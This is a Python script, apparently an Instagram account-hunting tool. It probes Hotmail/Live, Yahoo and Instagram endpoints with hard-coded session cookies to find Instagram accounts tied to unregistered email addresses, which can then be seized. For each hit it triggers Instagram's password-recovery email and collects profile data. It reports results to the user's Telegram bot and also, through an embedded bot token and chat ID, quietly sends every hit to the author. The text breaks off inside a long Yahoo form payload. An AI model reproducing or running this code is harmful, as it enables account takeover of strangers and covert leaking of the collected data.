import os
import json
import random
import requests
import time
from uuid import uuid4
from AegosPy import GetInfoInsta
from user_agent import generate_user_agent
import json
import uuid
from secrets import token_hex
from faker import Faker
import threading
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| أحمد الحراني
|{Z}[+] TeleGram  : {B} maho_s9    |
|{Z}[+] Instagram  : {B}ahmedalharrani |
|{Z}[+] Tool  : {B} متاحات-  IG 3 Domin|
|{Z}[+] Sever  : {B} Web + App|
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)
#------------------------------[فقط لنعرف صور الصيد]------------------------------#
tok = "6396326376:AAEaA-pxHwlpsT3_78ZYamaOGquLYjXYYhE"
io = "5845684006"
#------------------------------[لسنا بحاجه المتاحات]------------------------------#
DvD = "android-" + str(uuid4())
cone = token_hex(8).upper()   
bone = token_hex(8).upper()  
uid = uuid.uuid4()
lopp = str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())

def send(email):
	
    user = email.split('@')[0]
    
    headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }

    data = {
        'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"{email}"}}',
        'ig_sig_key_version': '4',
    }

    res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)

    if '"status":"ok"' in res.text:
        rest = res.json()['email']
    else:
        rest = 'Band Requests !'
    url = 'http://www.bradychrist.top/api/v7/user'
    
    he = {
     'Host': 'www.bradychrist.top',
     'Connection': 'keep-alive',
     'Content-Length': '13',
     'package': 'ins.bradychrist.com',
     'apptype': 'android',
     'User-Agent': generate_user_agent(),
     'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
	 'idfa': '93f87de7-a83b-4098-a8a7-6801539c5f6a',
	 'Accept': 'application/json, text/plain, */*',
	 'pk': '',
	 'username': '',
	 'version': '1.0',
	 'Origin': 'http://www.bradychrist.top',
	 'X-Requested-With': 'ins.bradychrist.com',
	 'Referer': 'http://www.bradychrist.top/h5_v12/',
	 'Accept-Encoding': 'gzip, deflate',
	 'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
} 
    da=(f'username={user}')
    rr=requests.post(url,headers=he,data=da)
    
    if 'data' in rr.text:
        try:
            Id=rr.json()['data']['userPk']
        except:
            Id = ""        
        try:
            post=rr.json()['data']['postsNum']
        except:
            post = ""
        try:
            flos=rr.json()['data']['followerNum']
        except:
            flos = ""
        try:
            flog=rr.json()['data']['followingNum']
        except:
            flog = ""        
        try:
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()
            da = re['date']
        except:
            da = 'No Date'
        try:
            Response = GetInfoInsta(user)
            Name = Response['name']
        except:
            Name = 'No Date'

        tlg = (f'''
        ☆ HI Mahos Getting Hits
        ☆ Name —> {Name}
        ☆ User —>  {user}
        ☆ Email —>  {email}
        ☆ Followers —> {flos}
        ☆ Following —> {flog}
        ☆ Date —> {da}
        ☆ Id —> {Id}
        ☆ Post —> {post}        
        ☆ Reset Email —> {rest}
        ☆ BY : @maho_s9
        ''')
        requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(io)+"&text="+str(tlg))
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
        
    else:
        erorr_tlg=(f'''
        صدت حساب بدون معلومات
	email >> {email}
	Username > {user}
	''')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(erorr_tlg))

def serverhotmail(email):
    url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
    headers = {
        "Host": "www.instagram.com",
        "content-length": "35",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1012215343",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "x-asbd-id": "129477",
        "x-requested-with": "XMLHttpRequest",
        "x-web-device-id": "DDA59EB4-9C86-4076-86D9-05AA6ECAC5F1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; ART-L29N Build/HUAWEIART-L29N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36",
        "x-csrftoken": "5Ag53kKeCuqP6Q1P-yW4Pq",
        "x-ig-app-id": "1217981644879628",
        "origin": "https://www.instagram.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.instagram.com/accounts/signup/email/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "ar,ar-YE;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
        "cookie": "csrftoken=5Ag53kKeCuqP6Q1P-yW4Pq; dpr=2; mid=ZfxzHQABAAGwuH_8BN6KLOyRFpWa; ig_did=DDA59EB4-9C86-4076-86D9-05AA6ECAC5F1; ig_nrcb=1; datr=EnP8ZXzIZo8DT7VXtpC_Ga1P"
    }

    data = {
        "email": f"{email}"
    }

    req = requests.post(url, headers=headers, data=data).text
    if "email_is_taken" in req:
        print(f'{F}Available IG : {email}')
        send(email)
    else:
        print(f'{Z}Bad IG >> {email}')



    
def serverAol(email):
    url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
    headers = {
        "Host": "www.instagram.com",
        "content-length": "35",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1012215343",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "x-asbd-id": "129477",
        "x-requested-with": "XMLHttpRequest",
        "x-web-device-id": "DDA59EB4-9C86-4076-86D9-05AA6ECAC5F1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; ART-L29N Build/HUAWEIART-L29N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36",
        "x-csrftoken": "5Ag53kKeCuqP6Q1P-yW4Pq",
        "x-ig-app-id": "1217981644879628",
        "origin": "https://www.instagram.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.instagram.com/accounts/signup/email/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "ar,ar-YE;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
        "cookie": "csrftoken=5Ag53kKeCuqP6Q1P-yW4Pq; dpr=2; mid=ZfxzHQABAAGwuH_8BN6KLOyRFpWa; ig_did=DDA59EB4-9C86-4076-86D9-05AA6ECAC5F1; ig_nrcb=1; datr=EnP8ZXzIZo8DT7VXtpC_Ga1P"
    }

    data = {
        "email": f"{email}"
    }

    req = requests.post(url, headers=headers, data=data).text
    if "email_is_taken" in req:
        print(f'{F}Available IG : {email}')
        send(email)
    else:
        print(f'{Z}Bad IG >> {email}')
        
def serverYahoo(email):
    cookies = {
        'csrftoken': 'YjlljueBSWzwt8WnqpCh6u',
        'dpr': '2.1988937854766846',
        'ps_n': '0',
        'ps_l': '0',
        'mid': 'ZfhWlgAEAAHpmM3pYl8NwjixXtRC',
        'ig_did': '32192E3C-8C2B-4C96-9656-373F7E7A9133',
        'datr': 'llb4ZSpC9kLGTAiiM6I4rFqm',
        'ig_nrcb': '1',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '2.19889',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(generate_user_agent()),
        'viewport-width': '891',
        'x-asbd-id': '129477',
        'x-csrftoken': 'YjlljueBSWzwt8WnqpCh6u',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1012280089',
        'x-requested-with': 'XMLHttpRequest',
    }

    timestamp = str(time.time()).split('.')[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:mahos999',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'username': email,
    }

    rr = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data).text
    if '"user":true' in rr:
        print(f'{F}Available IG : {email}')
        send(email)
    else:
        print(f'{Z}Bad IG >> {email}')
        
        
def Chotm(email):
    

        
    cookies = {
    'mkt': 'ar-YE',
    'mkt1': 'ar-YE',
    'amsc': 'bA5Ef8AumZKvEjr4QAIVZNssrimfbPTL8WJQYF+wkEyrBckAn/JEvB8XdTwFqWZmYPkhdN4R3kYuJY6a8eLcaA8GKObwewy7BBUy/q6DnYLOIY4SFt+/z+FKGyYDGRtWcNSnWHEpCPip1ySG2jPT9LRnum7l0bVEK5HiZafITyQypdsAGpCjAJ2K+UkSg6WvcrT+YBdTluZEjrBRDjUMrjrNleD6+ZNPS1sH7rTf9ztRcQD/fjXEQoAVF/YRnFhAmg5OSvR8ggLhcMpg+fqLu9biqpWKfWGhTOwHq0tB/ocaf6zQD/B0LSvMmInx0hbg:2:3c',
    'MicrosoftApplicationsTelemetryDeviceId': f'{uid}',
    'fptctx2': 'taBcrIH61PuCVH7eNCyH0F58uBDuZFZOunQHZt3FuglCLz0oLocB4ZxwpM%252bXSWYOT2zgQewDZP6bjcVKaFi%252fuKP8lI%252fxlw8kmNjUHmw19K1fEuRKnu9REG4yCTulvRb1%252f%252bgmdTI3vTxxnuaubG1fy9JB4zhkNGfsx7zaWaKvd%252fSrWuNc0c8EdBA18yNeFYX4eOdotunF85AEiv%252fr9mFiAaxOYUTM3JwDNwMFt%252bdOVKQXnW1b6cjqNEQSO76EgtYnc2N32u%252bZY0PxzQHW%252biWNB5OyFpRkv5jyPwoLTaSKncixv2NemfRcxHSudZEmYl3R',
    'MUID': f'{Lol}'
}
    headers = {
    'authority': 'signup.live.com',
    'accept': 'application/json',
    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
    'canary': 'XzB3tIudCygYTqFG9CkKg5QgGAUe4o2JQ6PAv7pdLP2DoEpa8/l19gnaNmP5qFf6lywXC9tLwJK2BDTVX7Zx6prjdIEmgwG5UDByRLoVyEXKWXRJ6Bhn8XHnRsy93TqPR7ZXgbsQLCTJyBwsmGIosxZDwCpye6JgKvIbG4E4ThpzixDNJMNJF3UgTGY+xUL1KB2bDVSQn6FKS3hPaSVbsUeFMBPyafB8qMuMwuk51ghKQYQ6F4OGq199vNKxFWRM:2:3c',
    'content-type': 'application/json',
    'hpgid': '200639',
    'origin': 'https://signup.live.com',
    'referer': f'https://signup.live.com/signup?contextid={cone}&opid={bone}&bk=1711606913&sru=https://login.live.com/login.srf%3fcontextid%3d{cone}%26opid%3d{bone}%26mkt%3dAR-YE%26lc%3d9217%26bk%3d1711606913%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-YE&lc=9217&uaid={lopp}',
    'scid': '100118',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'tcxt': '2G9cLlofk7IlffEbKbmLxWA7/mFIofenfJFoTmgtTsPwaliEIn73UmwwDASlfrGbip+xw5s+l7CPlNKxkLEDUhJrrFVWwyJfZtGW2ARgT/ygMcID6dVA06mg/U7lmFELKWgKEPVD4nlWXJyiwtEiaNx4RpSCDWgTZfCtWzAG7ViNBhNdhAI+Wkn11a4OfhQaaGnllrlYO+qqtK07FOCpyRfTP1Va/vAkCOHeCleHSeACQhWYDGAovWe6Xeiypm6BvYOGg5/euSkWqVq7Wss4HmF5fpTnRbB5B0guNHR66nwoa0IOlgE11ez14gVI35h8qKqwn1yklnAHZksjQ06piuRwiOZHQCatJj5WsWSUpq3WZna7H7zESqKNt/biiMLuXCaSfYHmcp5vuizNISg4VKlrofvIiICWsrZKiUabT5bP+NbQ0MAiWC3xuakaxo2Iwxxttv96xuIbDgLNKV2UUYZcAT1/4YfczhvetlIB4orWp09T/WvdN3O7WOGvm6kz7F7ktVN8QI+p2WlLVStCw5qKXCJRsJ6C+BtjkL1ZJLQeRt2TDl2Tlll3FeY9cBmf5XXzxobXeYPbpEImtN1kokKbKjd2KDHPopxdViy9bZs=:2:3',
    'uaid': lopp,
    'uiflvr': '1001',
    'user-agent': generate_user_agent(),
    'x-ms-apitransport': 'xhr',
    'x-ms-apiversion': '2',
}
     
    json_data = {
    'signInName': email,
    'uaid': lopp,
    'includeSuggestions': True,
    'uiflvr': 1001,
    'scid': 100118,
    'hpgid': 200639,
}
    res = requests.post(
    f'https://signup.live.com/API/CheckAvailableSigninNames?contextid={cone}&opid={bone}&bk=1711606913&sru=https://login.live.com/login.srf%3fcontextid%3d{cone}%26opid%3d{bone}%26mkt%3dAR-YE%26lc%3d9217%26bk%3d1711606913%26uaid%3d{lopp}&uiflavor=web&lic=1&mkt=AR-YE&lc=9217&uaid={lopp}',
    cookies=cookies,
    headers=headers,
    json=json_data,
).text
    if '"isAvailable":true' in res:
        
        print(f'{B}Good Hotamil >> {email}')
        serverhotmail(email)
    else:
        
        print(f'{Z}Bad Gmail >> {email}')


        
def chYahoo(email):  
	
    name = email.split('@')[0]
        
    cookies = {
    'A1': 'd=AQABBLGGBWYCEMSww7n7IqL2d7AmO-AHlJgFEgEBAQHYBmYPZtmZPjIB_eMAAA&S=AQAAAqSAU_qm8n26vDz_6yw3mbA',
    'A3': 'd=AQABBLGGBWYCEMSww7n7IqL2d7AmO-AHlJgFEgEBAQHYBmYPZtmZPjIB_eMAAA&S=AQAAAqSAU_qm8n26vDz_6yw3mbA',
    'A1S': 'd=AQABBLGGBWYCEMSww7n7IqL2d7AmO-AHlJgFEgEBAQHYBmYPZtmZPjIB_eMAAA&S=AQAAAqSAU_qm8n26vDz_6yw3mbA',
    'AS': 'v=1&s=fP1vEkw2&d=A6606d841|dO11GlH.2So3RfwcUOv8swouykVgovchfVsQm2RkNw_lqReSbSDAMeRE4Dzio8xLTd9GpmwUDdTimB4PRWkBssjje_O8Ml32jnBQKOIvEk8Da2DQ5MDmqiQJ2CsSo6PTQuSENWbUN5gk4VfY.S4C5wSKgun24EBWLhTWQsQKRewJnIjsdL1Kf9UW.QDRh4ClxknetnWsuJBsT5nfrPp8jPCA7cW7HIogycM6Y3l54NfWChZ03QD8Ecc.0UpVPBc.owvr.FSjF8sQBHV5Efi2r0pivvpdmN2v6hKupau.w6xUAYiH63ufAsUbPirbZYbkxChTEzNQUJT5BvCbSfBZYW2vVBhDvGvWNow3m.fQYWzsNK4L9X9kmNwAOTmejVDjB9uOcceB5NZW9Zjb3WrZ16SJunEgMeXfuAsmKr3._stYBi2ibS8DzzpxUa3xILitRas7aqKl8O5CjrnRHJRsncqIH1SyEEZ.zRwQHMkyJgoF6zJEMsXVoOOB7SbFlZbauVgG.r8Q_hiLyv9TJuP_NMLQsvWCLt4OT.7sM11BqsM_2fTw3wFtNyq0aU8in6C6YcK2k8B4crDVT_vEyCgecBM.s1V5VzEE0p0LvsyWQYiZVfg4HJmJU9AiZ_FE6F4pvr80Cb2nhOGc3udgTA1c_EFPbcYLByIqkPdvfs.e85K5c3LGoLct8rUMrIOQlXnr68XtfyQY1QSndn5_GvSkFs8kUOPiZC6RNCpebPrufOXUCtQDHxg7Qh_rqLNtUwWzdqPiv8u83eQ0qP1phYmi2gSfQpr76W6RF97XcqT8wQTlclilymw-~A|B6606d84d|si3jkWr.2TpMbnqRXzoWzqWHfDpJMdi1c2Y23pg9Qs0fIlAJEH0HemUm7LnRBJAosMfqduYc3CDJ0pvPXGtY_izwzQHgADDVxZJIwoRCiTXk4CSCFgbNUfBfEcO7tmp6SB4otpZo1wHkV7h.S4YkLP.Ss1i5dUQjWAf66MgqjXdXN0ONdtG4.nIBL1FiJ4rkOO2lzpVABEOE3_CN6yS9_OHdFHy0kqyze032MN1u0V.zf8qYZ.afSU7EBWDkqeY_fkx2nDOBAkZBndOBKW39HK9eYZRxnsvXW2ox0NqBwCPS1V.3EaKwFgXA6pZztGIZeoPD2CcwfUHjTxgcflZFcBA0a6MSvUxc1qk1FXypdPCIhohg4khOKC_XZ6Vc5WaZvhi.aykRPnGP6lLFnZUTag7XqfNdrQM7urtTrcjsqlkEGTTV4rATJrkwMSky6qucKgch_TRwHkzaXNgbUluhMiDfVWWNfFhm4cxb8wp.pI4s1QhgAwG_ZYdTpVgKxtXgxnAUUPbDtklupnUFQfhhyUy0tGz56aU1uqHoWrRPqK4cAndZbSL996YCIEIlXqBeTqz742DtCUWrrGsnTh3LbfAOBominGsI4.3SqSi6hS7111xOvG8IhEOu7NoK38zwj1BISj.5ZtRu5L0E2Wgxha155dv18XZhWj046e_i_yPqIDLIQ1UkWUOIVJ1c970OpHDev3gskiyUcyl11kCThiLK8noKCcVXxTyj7AYqEiGhOWV350TERw6n8r9MK1uxXxKZLRWU2vEiuofFkKxWSxH_1PzpEZCA7ezSb58j9OR3zthaJ1Wv1eFtmgdQD4kzpxPI3DluWGQ8jZhVmGjRk8pzzLlkCgG7aiXP8_x3PXE6LTtRAlJ9DImxSLqOTUfxN3igk1kXnE_1ICGS2KfScAgcIEmEo1As4Kcm2hgnLmXjbgmU5dt3vs0kQwd8PZU-~A',
}
    headers = {
    'authority': 'login.yahoo.com',
    'accept': '*/*',
    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://login.yahoo.com',
    'referer': 'https://login.yahoo.com/account/create?.intl=jo&.lang=ar-JO&src=ym&activity=header-signin&pspid=1197806870&.done=https%3A%2F%2Fmail.yahoo.com%2Fd&specId=yidregsimplified&done=https%3A%2F%2Fmail.yahoo.com%2Fd',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}
    params = {
    'validateField': 'userId',
}

    data = f'browser-fp-data=%7B%22language%22%3A%22ar-YE%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-180%2C%22timezone%22%3A%22Asia%2FAden%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Linux%20armv81%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(ARM)~ANGLE%20(ARM%2C%20Mali-G51%2C%20OpenGL%20ES%203.2)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A11%2C%22hash%22%3A%221b3c7bec80639c771f8258bd6a3bf2c6%22%7D%2C%22audio%22%3A%22124.08072766105033%22%2C%22resolution%22%3A%7B%22w%22%3A%22360%22%2C%22h%22%3A%22780%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22780%22%2C%22h%22%3A%22360%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1711638221450%2C%22render%22%3A1711638223375%7D%7D&specId=yidregsimplified&cacheStored=&crumb=exsxyOsKmB16fYpxCTvXwg&acrumb=fP1vEkw2&sessionIndex=Qg--&done=https%3A%2F%2Fmail.yahoo.com%2Fd&googleIdToken=&authCode=&attrSetIndex=0&specData=0FDb9D3jurAW1aA%2BDZS75SRP%2Bl9nW3sOd%2F8ueRlRnqjKBRMhZYkX9TPDJGds5%2FDT0LIgu%2F1JLjNWprD3LMs3FJdSueYvKzQwAlV0mg83fBKfH1f%2FJySsM%2B%2FG%2F0PJBSJxAPGjTvAOT%2FOcXI82T4hPKC87pS%2FHWdqy0J%2FTWFh7twVuB4NUuCwheh%2BaapzAkzMQ69cI08WGZGxXR4RoVryrZCfxfih%2FIio5eGKsyLeWkxktHYuC36A6%2ByCEyW6BuEb3ev4AdrTatGphw4zpodxoLHlxgyFsgkOadKVcKZ%2B7m2FBeCV2CTqMJu%2BbTzJ7MJ%2B2Yxosn%2FakpqVpLGA%2BHLVsY%2B2OHZGpkqNI1LwwEVT0iBhKXMGuI0ooHLr3BSaJ2qtX9zrLsmkYhfHqIlG2W4AuxPpECNgFwYH%2FlB7LcNlXp8EqgrSotO2krpTVRRpxLQ3FjLLQFdbwokTjtGmAn5khENKeOpKWmowmN1K6E5aYrOopGzrwCqcoI3AskjJry3My2veEX2TTMq9YrKqGapkhZK3K30Z8HqUCLH8woBTE6m7BO%2FcOlNacmgJMdo1BNqvGDc41sBGyvrD8zOCxv717twTK69GIQvDzLx0%2FjpCnbFnI%2F2VQ5DdMq3xU2St25taGu1W3nIYMkOwFFGtg2bYtI3B67AfdRmFec2Ngfm%2B3s1NsNrrH7BXll1uhQymBBtjVe7ISAPYvUey%2BBxbx8DPJZdEMDEE6f0IN9hdry9tTU8JaR5gnR9BLxAmdLdCN99deFg%2FBlMa1%2B05K8VCSn1v8ZdKY1OM%2F5xe8CJPRw9nSC%2FxW%2FM27NQU9V%2B0VmNFRQHylo4FGjOu5DWiVzD483GjjH2sIPZnbZ1R%2FdDNCWBbdeEQbA%2B0nnk7AYWW4t%2FSYMMmDUtTX657EFBadPHnOU6Dyxu%2F7qqpUqriw0r8NdG%2B3JramcTbT4K9HhL7Clp%2BUSlpP3%2B8YzedzwTSGwcZDsIGMdWr8rkw%2FP3Bu0WslcrT65tMhDuhwK83grFQWfEZFI2hwcGP90uEMNwuN5R6n0V7uAvIIAECs7mNQA6piyZUiWJjEYALuWVFVHqQNERJR3cT%2Bp9lDFJSuKTG%2BF2AsrfmEAEICeIy9rCDepYYSDmb8wNWsBUVM4sa1X%2FZBI0PLtgvMwmbgf5MWHVjZfz5KDjo4ozLGlhbAUboLeY6AwZq2Vr8NMMWjw0RMSf2d%2FTMp962rtYsxoh1zDm2pmTQw44CAIMW%2BnnBSUSudEYQdmTWKjBFN0Ni0ZgzlszpnHj%2BRfZDZ%2BmnYBZ1BLhTf2GylSxbepI9D32liubjT7CU9y93z9huMvuITojM5OkSDq4ogdghwiYwtkzCmdN2lx1Erb64dPYZGiVeX%2FQ7fAvG7Uh18MLFXsbKeEDwuV0W5U6%2BUi9ilmu04LAyrAvNb%2B2mBBltliKdbzj9WiEX3FA4aCbDktrnKCCT8zu9sUhbcZd1l6ZBWw%2BTVf8HzlhMEpeEWR5CwLMdy33p0h3JLS1rMWhdcu9J3BNayBU8TOLxIaryf9Z5gVNMb1WwAeUHrvOSY5dzYtjSIm0oQN7CH1TWFSPyDUu%2BzhakmIiGHVpLEADtu4G567a8SbFcRT93p4FNLupnom8yCiDncGh2SIlbMPQ9ND99zZQ0CmcVU5D9GMIzMEotFaCvfjg3BCtE9l1UfQa%2B5cAjAyPOsznNrNySNqaOb6ge2qRGSHN9dIvW8irMqnE9KJd8JXyYIPF6sW8MKcsO9THk9h4AR4QeY6XXOT3dpQeU2K9lNavpt%2BafQtVZpyXpADP8lfpJrVBzQiTJx4e9WKe3WJiAULSOegxHYo3I%2BKYW0QzxUYBggIodbBI2LZ8hTmpE9DNZTqbuudG5gsouVj4KcFrr33zbnQvMiT5sG406%2FXl%2BpvrgaEagmDLWGtCqGQNSrxO8eBjKUfdUCN%2BMmqdR8fIM%2BzllgJptmKqYXdPaNavGhoDXWVKAKXGpqXq%2BZOoePjXtqIIR8Lvsd0dityfU8GTteye9aqqbM0Jx%2BsZYLcweKYy85A5awLXioFZzhnkkxA0ZZsWEOJ2Va9k9eOPWQs8r2PoxN0419QtNt6jLj%2BP5UwAsvHfRAqgTrf%2FRUOneByiip64QudhoXjO1T1TkcHEHNP0Dc2OCG6XXgPqwVYbkeZ4AYLT2uhnzFvvM96vwPoTrxXbzE7GfHzlm4OTohq2xwBwIVVEdobVCmM8opm1es0GZZFste%2B2Wt67ffwxeoq%2FACzG0h%2BWu%2Bm3T0WF0hkzTLai%2FNVZbRXotabWwNaLPonXtMkoa61Uib407jWld9dFmmxFlr5Al32ChhcvaJKC0YxjL9r5znwfG4RDpz88OE0rrBQvkLKP8t9GeXUVsU%2BNlz4ET6ZuMhA0804b7Ish7HXRhHRMrLE0smia%2BxbUQNNQZt3f3ow5Curnsk94PKIWRtXfIad6pcD0asNIQUbBDmUonO3kdTP5Y6NHTzQAzJeaDSg0UyW0xXAcLSP5kDTBDj2hOaNJrc6o%2BVPTuPx5tHyns%2BJ8POysfV9SrCPo1TICrINr%2Bf3huZYlfPTvf%2BrODK%2BTwUoPsclVKStn1kQ5Pz2Gz0GS0lf%2FyJd9%2FX23nvf7WuWmmX4%2F8ad1%2FGz0DWuqEdUDaZ73AnS5X3n0S5ApMqDCxJSDRAHF9M4otsDH%2F8wThID95uPWthdGzfTOtzLQmqFWXOv%2BouxztCUAefbbOjajuvn133V5rTjfb3YFpoGpgf0CGnPUd7Fx7FcVSkmiLSUU669c%2FJXOlRe4H69OumJ6hGSHrtEe%2BUHF6TjJo17Z%2B05SqP9T1%2BwcZwJNn%2BCtGhzB3tpJdw%2BDQ77vivu5p%2FDpHBLYiWzmfN0u6OqoXsF68jse3w1uXqmZRxuGjQOyI2r3SKrjC2HlVilLRL5vcWORNdxYTeBZRCLA42VQjdCfk5ux6jYIpqEEinc3iHcfBaUtmjsjwritASPaUkdjOLouCA9hBwbOYC1bMFo1vxtnjxbZY8cvmeuwNXvwaXcNy8qBl5w55BRca10WD1%2FKPfROSY7FuoC9MI3vytZ0dJrMeASngxuWGAOmkuXFHnKxQD7Qygnul2jzWYwN%2BFRT9vX%2Bk3oGr9aY%2BJtrcbD2eyXbacb3heniqk3KONg3%2FOoUERK1pJRlI4JHD3JRwK3xReAo4PAY%2Bhjhsh3L5A0TyTq2sDuk5PXrhyg0xR3PWe5Xn5zJH9LGwfaT0DZFBjVcqbxjIDBS%2F%2BPfl6oXG2LmKRqWnvKFzCdpVeERai6z%2F%2FflwEkSxnxxBWLG%2BzxKCra%2B06TDu